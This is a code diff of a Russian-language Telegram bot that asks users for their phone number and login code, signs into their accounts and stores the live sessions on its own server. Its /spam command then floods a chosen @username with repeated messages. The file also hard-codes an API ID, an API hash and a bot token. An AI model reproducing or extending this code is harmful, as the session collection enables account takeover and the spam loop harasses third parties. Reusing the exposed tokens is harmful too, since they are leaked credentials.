@@ -1,9 +1,13 @@
 import asyncio
+import os
 from pyrogram import Client, filters
 
 API_ID = 34887681
 API_HASH = "9a2905a9627fb1959b6699452ec59e99"
 BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"
+
+# Создаём папку для сессий
+os.makedirs("sessions", exist_ok=True)
 
 app = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -29,8 +33,9 @@ async def get_number(c, m):
     
     number = m.text.strip()
     try:
-        # Создаём и запускаем клиент
-        client = Client(f"sessions/{chat_id}", api_id=API_ID, api_hash=API_HASH)
+        # Создаём клиент с уникальным именем сессии для каждого пользователя
+        session_name = f"sessions/user_{chat_id}"
+        client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
         await client.start()
         sent = await client.send_code(number)
         
@@ -42,7 +47,7 @@ async def get_number(c, m):
         }
         await m.reply(f"✅ Код подтверждения отправлен на {number}\nВведи код цифрами:")
     except Exception as e:
-        await m.reply(f"❌ Ошибка: {str(e)[:100]}\nПопробуй другой номер или /start заново")
+        await m.reply(f"❌ Ошибка: {str(e)[:150]}\nПопробуй другой номер или /start заново")
 
 @app.on_message(filters.private & filters.regex(r"^\d{4,6}$"))
 async def get_code(c, m):
@@ -69,7 +74,7 @@ async def get_code(c, m):
         user_states[chat_id]["logged"] = True
         await m.reply("✅ Вход выполнен успешно!\nТеперь используй /spam @username")
     except Exception as e:
-        await m.reply(f"❌ Ошибка входа: {str(e)[:100]}\nПопробуй код ещё раз или /start заново")
+        await m.reply(f"❌ Ошибка входа: {str(e)[:150]}\nПопробуй код ещё раз или /start заново")
 
 @app.on_message(filters.private & filters.command("spam"))
 async def start_spam(c, m):
@@ -98,12 +103,11 @@ async def start_spam(c, m):
             if count % 20 == 0:
                 await m.reply(f"📨 Отправлено {count} пачек печенья")
     except Exception as e:
-        await m.reply(f"❌ Ошибка спама: {str(e)[:100]}")
+        await m.reply(f"❌ Ошибка спама: {str(e)[:150]}")
 
 @app.on_message(filters.private & filters.command("stop"))
 async def stop_spam(c, m):
-    await m.reply("🛑 Остановка... Перезапусти бота, чтобы остановить спам")
-    # Жесткая остановка
+    await m.reply("🛑 Остановка...")
     raise SystemExit
 
 if __name__ == "__main__":
